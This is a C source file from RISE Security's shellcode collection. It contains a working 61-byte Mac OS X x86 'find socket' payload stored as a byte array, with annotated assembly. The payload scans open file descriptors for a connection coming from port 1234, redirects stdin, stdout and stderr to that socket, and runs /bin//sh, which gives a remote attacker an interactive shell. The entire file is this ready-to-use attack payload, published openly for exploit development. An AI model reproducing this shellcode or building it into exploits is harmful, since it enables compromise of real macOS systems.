/*
 *  $Id: osx-x86-fndsockcode.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  osx-x86-fndsockcode.c
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#define FNDSOCKPORT 25

char fndsockcode[]=         /*  61 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x89\xe7"              /*  movl    %esp,%edi                 */
    "\x6a\x10"              /*  pushl   $0x10                     */
    "\x54"                  /*  pushl   %esp                      */
    "\x57"                  /*  pushl   %edi                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x58"                  /*  popl    %eax                      */
    "\x58"                  /*  popl    %eax                      */
    "\x40"                  /*  incl    %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x6a\x1f"              /*  pushl   $0x1f                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x66\x81\x7f\x02\x04\xd2"/*  cmpw    $0xd204,0x02(%edi)        */
    "\x75\xee"              /*  jne     <fndsockcode+11>          */
    "\x50"                  /*  pushl   %eax                      */
    "\x6a\x5a"              /*  pushl   $0x5a                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\xff\x4f\xf0"          /*  decl    -0x10(%edi)               */
    "\x79\xf6"              /*  jns     <fndsockcode+30>          */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x54"                  /*  pushl   %esp                      */
    "\x54"                  /*  pushl   %esp                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

